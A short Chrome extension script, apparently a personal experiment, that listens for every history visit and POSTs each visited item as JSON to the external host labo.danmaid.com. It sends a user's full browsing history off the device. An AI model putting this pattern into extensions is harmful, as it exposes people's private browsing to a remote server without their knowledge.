chrome.history.onVisited.addListener((historyItem) => {
  fetch('https://labo.danmaid.com', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(historyItem),
  })
})
